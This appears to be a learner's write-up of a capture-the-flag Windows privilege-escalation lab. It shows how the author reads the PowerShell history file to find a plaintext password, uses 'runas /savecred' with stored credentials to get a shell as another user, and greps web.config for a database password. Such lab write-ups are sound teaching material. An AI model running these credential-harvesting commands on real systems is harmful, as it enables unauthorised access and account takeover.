Looking at our powershell history. This is actually easier from cmd.exe rather than powershell so I spawned a cmd prompt from powershell. but it is possible from PS. To quote the page:

"Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. "

PS C:\Users\thm-unpriv> cmd.exe
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm-unpriv>
C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
**cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z**
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
cmd.exe


cmdkey /list

gives us:

Domain:interactive = WPRIVESC1\mike.katz
Type: Domain Password
User: WPRIVESC1\mike.katz

Now we can run a cmd prompt as mike.katz:
runas /savecred /user:mike.katz cmd.exe 

This spawns another cmd.exe this time running as mike.katz and we can navigate to the C:\Users\mike.katz\Desktop and read the flag with
type flag.txt 

(type works a little like cat on Linux boxes)

I did Q2 out of order, but I don't suppose it matters.
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config>type web.config | findstr connectionString 

gives us the db_admin password:
connectionString="Server=thm-db.local;Database=thm-sekure;User ID=*db_admin*;Password=*098n0x35skjD3*" name="THM-DB"

Don't put credentials in code!




